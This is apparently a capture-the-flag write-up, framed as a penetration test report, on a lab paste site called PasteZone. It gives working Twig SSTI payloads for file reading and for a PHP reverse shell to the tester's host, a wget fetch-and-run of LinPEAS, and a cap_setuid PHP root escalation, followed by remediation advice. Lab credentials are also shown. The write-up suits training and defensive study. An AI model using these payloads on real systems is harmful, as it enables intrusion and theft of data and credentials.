# PasteZone Penetration Testing Report

  

---

  

## Executive Summary

  

This report documents the comprehensive security assessment conducted on the PasteZone web application hosted at `pastezone.hv` (172.20.5.99). The assessment identified critical vulnerabilities that allowed complete system compromise, from initial reconnaissance to root-level access.

  

**Key Findings:**

- **Critical:** Server-Side Template Injection (SSTI) vulnerability in the Twig template engine

- **Critical:** Improper capability assignment on PHP binary (`cap_setuid+ep`)

- **High:** Exposed sensitive database containing user IP addresses and credentials

- **High:** Plaintext storage of administrator credentials

  

The exploitation chain progressed from SSTI to Local File Inclusion (LFI), remote code execution (RCE), and ultimately privilege escalation to root access. Sensitive data including administrator credentials, phone numbers, and attacker IP addresses were successfully extracted.

  

---

  

## 1. Enumeration

  

### 1.1 Initial Setup

  

The target domain was mapped to the local network environment by modifying the hosts file:

  

```bash

sudo nano /etc/hosts

```

  

The following entry was added:

  

```

172.20.5.99 pastezone.hv

```

  

### 1.2 Information Gathering

  

Initial reconnaissance revealed a paste-sharing platform at `http://pastezone.hv`. The application allows users to create and view text-based content through the following endpoints:

  

- `http://pastezone.hv/create.php` - Content creation interface

- `http://pastezone.hv/view.php?id=<ID>` - Content viewing interface

  

Analysis of the content revealed a data breach advertisement posted at `http://pastezone.hv/view.php?id=37`:

  

```

[SELLING] Energy Ministry (energy.gov.hv) Complete Data Breach

  

Complete data breach obtained from Energy Ministry systems. Full access to the

ministry's internal network was achieved and critical data was extracted.

  

Breach contents:

- 1500+ employee information and credentials

- Internal communications and classified documents

- Energy infrastructure plans and security protocols

- Nuclear facility security documents

- Administrative accounts and access information

  

Internal domain structure:

- admin.energy.gov.hv

- mail.energy.gov.hv

- intranet.energy.gov.hv

- scada.energy.gov.hv

- nuclear.energy.gov.hv

- hr.energy.gov.hv

- finance.energy.gov.hv

  

Sample user credentials:

john.smith@energy.gov.hv:Energy2023!

michael.brown@energy.gov.hv:Capital2022*

sarah.jones@energy.gov.hv:System1234#

[...]

  

Contact: darkleaker@protonmail.hv

```

  

**Finding #1:** Attacker contact email identified: `darkleaker@protonmail.hv`

  

---

  

## 2. Exploitation: Server-Side Template Injection (SSTI)

  

### 2.1 Vulnerability Discovery

  

Testing was conducted on the content creation form at `http://pastezone.hv/create.php` to identify potential injection vulnerabilities. A mathematical expression was submitted to determine if server-side template evaluation was occurring:

  

**Test Payload:**

```

{{ 7*7 }}

```

  

**Result:** The application returned `49`, confirming the execution of template code on the server side.

  

This behavior indicated the presence of a **Server-Side Template Injection (SSTI)** vulnerability, likely in the Twig templating engine commonly used in PHP applications.

  

### 2.2 Exploitation Mechanism: SSTI to LFI

  

The Twig template engine was exploited to achieve Local File Inclusion (LFI) capabilities. The vulnerability stems from Twig's ability to invoke PHP functions through array filters and methods. Specifically:

  

1. **Twig Array Filters:** Twig allows the use of filters like `map()` which can apply PHP functions to array elements

2. **PHP Function Invocation:** The `file_get_contents()` function can be invoked through the `map()` filter

3. **PHP Stream Wrappers:** The `php://filter` stream wrapper enables advanced file manipulation, including encoding

  

The following payload was constructed to extract the SQLite database:

  

```twig

{{ ['php://filter/read=convert.base64-encode/resource=/var/www/html/database/pastezone.db'] | map('file_get_contents') | join }}

```

  

**Technical Breakdown:**

- `['php://filter/...']` - Creates an array containing a PHP filter stream wrapper

- `map('file_get_contents')` - Maps the `file_get_contents()` PHP function over the array

- `php://filter/read=convert.base64-encode/resource=...` - Applies base64 encoding to the file content

- `join` - Concatenates the result into a single string

  

Base64 encoding was necessary because the binary SQLite database contains non-printable characters that would be corrupted in HTTP transmission.
### 2.3 Database Extraction and Analysis

  

The base64-encoded database output was saved and decoded locally:

  

```bash

nano 64pastezonedb.txt

base64 -d 64pastezonedb.txt > pastezone.db

```

  

The database was analyzed using SQLite DB Browser. Examination of the `posts` table revealed the IP address associated with post ID 37:

  

| id | title | content | creator | views | rating | ip_address | created_at |

|----|-------|---------|---------|-------|--------|------------|------------|

| 37 | [LEAK] energy.gov.hv - Energy Ministry Full Database Breach | [...] | DarkLeaker | 35684 | 45 | **185.173.35.5** | 2025-12-31 01:41:28 |

  

**Finding #2:** Attacker IP address identified: `185.173.35.5`


---

  

## 3. Remote Code Execution (RCE)

  

### 3.1 Establishing a Reverse Shell

  

With confirmed SSTI vulnerability, the next objective was to establish remote code execution. A reverse shell payload was crafted to gain interactive access to the target system.

  

A netcat listener was configured on the attacker machine:

  

```bash

nc -nvlp 4445

```

  

The following SSTI payload was submitted through the `create.php` endpoint:

  

```twig

{{['php -r \'$sock=fsockopen("10.8.73.133",4445);exec("/bin/sh -i <&3 >&3 2>&3");\'']|filter('passthru')}}

```

  

**Technical Details:**

- `filter('passthru')` - Twig filter that invokes PHP's `passthru()` function

- `passthru()` - PHP function that executes external programs and displays raw output

- The PHP one-liner establishes a TCP socket to the attacker's IP and redirects stdin/stdout/stderr through file descriptor 3

  

**Result:** Successful reverse shell connection established.

  

```bash

┌──(macallan㉿kali)-[~/Downloads/Hackviser/writeup/pastezone]

└─$ nc -nvlp 4445

listening on [any] 4445 ...

connect to [10.8.73.133] from (UNKNOWN) [172.20.5.99] 34052

/bin/sh: 0: can't access tty; job control turned off

$

```

  

### 3.2 Shell Stabilization

  

The initial shell was non-interactive and lacked proper terminal functionality. Shell stabilization was performed using Python's PTY module:

  

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

export SHELL=bash

```

  

This provided a fully interactive bash shell with proper terminal emulation:

```bash
┌──(macallan㉿kali)-[~/Downloads/Hackviser/writeup/pastezone]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.8.73.133] from (UNKNOWN) [172.20.5.99] 34052
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@debian:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@debian:/var/www/html$ export TERM=xterm
export TERM=xterm

```

```
www-data@debian:/var/www/html$ 
```


---

  

## 4. Privilege Escalation

  

### 4.1 Automated Enumeration with LinPEAS

  

To identify privilege escalation vectors, the LinPEAS (Linux Privilege Escalation Awesome Script) automated enumeration tool was deployed. LinPEAS performs comprehensive security audits including:

  

- SUID/SGID binary identification

- Capability analysis

- Cron job enumeration

- Writable file detection

- Credential searching

  

The tool was transferred from the attacker machine:

  

```bash

# Attacker machine

cp /usr/share/peass/linpeas/linpeas.sh /home/macallan/Downloads

python3 -m http.server 8080

```

  

```bash

# Target machine

cd /tmp

wget http://10.8.73.133:8080/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

```

  

### 4.2 Critical Finding: PHP Capability Misconfiguration

  

LinPEAS output revealed a critical privilege escalation vector:

  

```

Files with capabilities (limited to 50):

/usr/bin/php8.4 cap_setuid+ep

```

  

**Technical Analysis:**

  

Linux capabilities divide root privileges into distinct units. The `CAP_SETUID` capability allows a process to manipulate its user ID, effectively enabling privilege escalation to any user including root.

  

The capability string `cap_setuid+ep` breaks down as follows:

- `cap_setuid` - The capability to set user ID

- `+e` - **Effective** - The capability is currently active

- `+p` - **Permitted** - The capability is available to use

  

This configuration allows the PHP binary to execute the `posix_setuid(0)` function, changing the effective user ID to 0 (root) without requiring sudo or SUID permissions.

  

### 4.3 Exploitation: Privilege Escalation to Root

  

The PHP capability was exploited to spawn a root shell:

  

```bash

/usr/bin/php8.4 -r "posix_setuid(0); system('/bin/bash');"

```

  

**Breakdown:**

- `/usr/bin/php8.4 -r` - Execute PHP code from command line

- `posix_setuid(0)` - Change effective user ID to 0 (root)

- `system('/bin/bash')` - Spawn a bash shell with the new privileges

  

**Result:** Root access achieved.

  

```bash

root@debian:/tmp#

```
  
---

  

## 5. Post-Exploitation and Data Collection

  

### 5.1 Administrator Credential Discovery

  

With root access established, sensitive directories were enumerated. The `/root` directory contained two critical files:

  

```bash

root@debian:/root# ls

backup.py

github.txt

```

  

Examination of `github.txt` revealed administrator credentials:

  

```bash

root@debian:/root# cat github.txt

michaelcarter@mailbox.hv:MKEVQV5VsQ4qc

```

  

**Finding #3:** Platform administrator GitHub credentials: `michaelcarter@mailbox.hv:MKEVQV5VsQ4qc`


```
root@debian:/root# cat github.txt
cat github.txt
michaelcarter@mailbox.hv:MKEVQV5VsQ4qc
root@debian:/root# 
```


### 5.2 Infrastructure Administrator Phone Number

  

Analysis of the `backup.py` script revealed infrastructure management details:

  

```python

# send_self_file.py

# Sends a local file (pastezone.db) to yourself on Telegram.

  

from telethon import TelegramClient

import asyncio

  

# === CONFIGURATION (replace with your info) ===

API_ID = 12345678 # your API ID from my.telegram.org

API_HASH = "0123456789abcdef0123456789abcdef" # your API HASH

YOUR_PHONE = "+12025550123" # your own phone number

FILE_PATH = "/var/www/html/database/pastezone.db" # file to send

  
  

async def main():

# Create Telegram client

client = TelegramClient("self_session", API_ID, API_HASH)

await client.start(phone=YOUR_PHONE)

  

# Get yourself

me = await client.get_me()

  

# Send the file to yourself

await client.send_file(me, FILE_PATH, caption="Backup of pastezone.db")

print(f"✅ File '{FILE_PATH}' sent to yourself successfully!")

await client.disconnect()

  
  

if __name__ == "__main__":

asyncio.run(main())

```

  

This script automates database backups via Telegram, exposing the administrator's phone number and Telegram API credentials.

  

**Finding #4:** Infrastructure administrator phone number: `+12025550123`

---

  

## 6. Conclusion and Remediation

  

### 6.1 Summary of Findings

  

This assessment successfully compromised the PasteZone infrastructure through a multi-stage attack chain:

  

1. **SSTI Vulnerability:** Unfiltered user input processed by Twig template engine

2. **LFI via SSTI:** Database extraction using PHP stream wrappers

3. **RCE via SSTI:** Reverse shell established through `passthru()` function

4. **Privilege Escalation:** PHP binary capability misconfiguration enabled root access

5. **Credential Exposure:** Plaintext storage of sensitive administrator information

  

### 6.2 Remediation Recommendations

  

**Critical Priority:**

  

1. **Disable Template Evaluation of User Input**

- Remove or sanitize all Twig template processing of user-supplied content

- Implement strict input validation and output encoding

- Use parameterized templates that separate code from data

  

2. **Remove Dangerous PHP Capabilities**

```bash

sudo setcap -r /usr/bin/php8.4

```

PHP binaries should never have `cap_setuid` capabilities in production environments.

  

3. **Implement Proper Credential Management**

- Remove plaintext credentials from filesystem

- Implement encrypted credential storage (e.g., HashiCorp Vault, AWS Secrets Manager)

- Rotate all exposed credentials immediately

  

**High Priority:**

  

4. **Database Security Hardening**

- Implement proper file permissions on SQLite database (e.g., `chmod 600`)

- Move database outside web root directory

- Consider migrating to a client-server database with access controls

  

5. **Web Application Firewall (WAF)**

- Deploy WAF with SSTI detection rules

- Implement rate limiting on content creation endpoints

- Enable logging and alerting for suspicious payloads

  

6. **Network Segmentation**

- Restrict outbound connections from web server

- Implement egress filtering to prevent reverse shells

- Use application-level proxies for legitimate external communications

  

**Medium Priority:**

  

7. **Security Monitoring**

- Deploy intrusion detection system (IDS)

- Implement file integrity monitoring (FIM) on critical files

- Enable comprehensive audit logging (`auditd`)

  

8. **Principle of Least Privilege**

- Run web server processes with minimal required permissions

- Implement AppArmor or SELinux mandatory access controls

- Separate application components with different service accounts

  

### 6.3 Security Implications

  

The identified vulnerabilities represent a complete security failure, allowing unauthorized actors to:

- Extract sensitive user data and IP addresses

- Execute arbitrary code on the server

- Achieve root-level system compromise

- Access administrator credentials and communication channels

  

Immediate remediation is required to prevent exploitation by malicious actors.

  

---

  

**Report Generated:** 2026-01-18

**Assessment Type:** Capture The Flag (CTF) Security Exercise

**Target System:** PasteZone Web Application (pastezone.hv)

**MacallanTheRoot**: https://github.com/MacallanTheRoot
